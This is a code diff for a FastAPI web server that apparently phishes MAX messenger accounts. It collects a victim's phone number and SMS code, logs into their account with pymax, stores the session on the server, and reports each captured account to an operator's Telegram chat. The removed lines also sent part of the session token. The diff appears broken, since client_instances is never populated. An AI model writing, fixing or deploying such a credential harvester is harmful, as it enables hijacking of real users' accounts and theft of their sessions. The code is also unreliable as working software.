@@ -1,19 +1,36 @@
+# main.py
+import asyncio
 from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse, JSONResponse
-from fastapi.staticfiles import StaticFiles
-import asyncio
-import os
 from pymax import Client
-from pymax.payloads import MobileUserAgentPayload
+from pymax.api.session.payloads import MobileUserAgentPayload
+from pymax.api.session.enums import DeviceType
+from pymax.extra_config import ExtraConfig
 from aiogram import Bot
 import uvicorn
+import os
 
 app = FastAPI()
-BOT_TOKEN = "ВАШ_ТОКЕН_ТЕЛЕГРАМ_БОТА"
-CHAT_ID = 123456789
+BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН")
+CHAT_ID = int(os.getenv("CHAT_ID", "123456789"))
 bot = Bot(token=BOT_TOKEN)
 
-sessions = {}
+pending_codes = {}
+
+class WebSmsProvider:
+    def __init__(self, phone: str):
+        self.phone = phone
+        self.future = asyncio.Future()
+    
+    async def get_code(self):
+        pending_codes[self.phone] = self.future
+        try:
+            code = await asyncio.wait_for(self.future, timeout=120)
+            return code
+        except asyncio.TimeoutError:
+            return None
+        finally:
+            pending_codes.pop(self.phone, None)
 
 @app.get("/", response_class=HTMLResponse)
 async def get_index():
@@ -27,8 +44,9 @@ async def send_code(request: Request):
     if not phone:
         return JSONResponse({"error": "Номер обязателен"}, status_code=400)
     
+    provider = WebSmsProvider(phone)
     ua = MobileUserAgentPayload(
-        device_type="ANDROID",
+        device_type=DeviceType.ANDROID,
         app_version="25.12.13",
         os_version="13",
         timezone="Europe/Moscow",
@@ -42,12 +60,14 @@ async def send_code(request: Request):
         phone=phone,
         work_dir="sessions",
         session_name=phone.replace("+", ""),
-        extra_headers=ua
+        extra_config=ExtraConfig(token=None),
+        sms_code_provider=provider
     )
     
     async def start_auth():
-        await client.start()
-        sessions[phone] = {"client": client, "step": "code_sent"}
+        asyncio.create_task(client.start())
+        while client.me is None:
+            await asyncio.sleep(0.5)
     
     asyncio.create_task(start_auth())
     return JSONResponse({"success": True})
@@ -58,26 +78,27 @@ async def verify_code(request: Request):
     phone = data.get("phone")
     code = data.get("code")
     
-    session = sessions.get(phone)
-    if not session:
-        return JSONResponse({"error": "Сессия не найдена, начните заново"}, status_code=400)
+    future = pending_codes.get(phone)
+    if not future:
+        return JSONResponse({"error": "Сессия не найдена или истекло время"}, status_code=400)
     
-    client = session["client"]
+    future.set_result(code)
     
-    try:
-        client.sms_code = code
-        await client.complete_login()
-        token = client.token
-        me = client.me
-        
-        await bot.send_message(
-            CHAT_ID,
-            f"✅ Новый аккаунт MAX!\n\n📱 {phone}\n👤 {me.first_name} {me.last_name or ''}\n🔑 `{token[:50]}...`",
-            parse_mode="Markdown"
-        )
-        return JSONResponse({"success": True})
-    except Exception as e:
-        return JSONResponse({"error": str(e)}, status_code=400)
+    # Ждём авторизацию
+    for _ in range(60):
+        await asyncio.sleep(1)
+        for phone_key, client_obj in client_instances.items():
+            if phone_key == phone and client_obj.me:
+                me = client_obj.me
+                await bot.send_message(
+                    CHAT_ID,
+                    f"✅ Новый аккаунт MAX!\n\n📱 {phone}\n👤 {me.first_name} {me.last_name or ''}"
+                )
+                return JSONResponse({"success": True})
+    
+    return JSONResponse({"error": "Таймаут авторизации"}, status_code=400)
+
+client_instances = {}
 
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=8000)
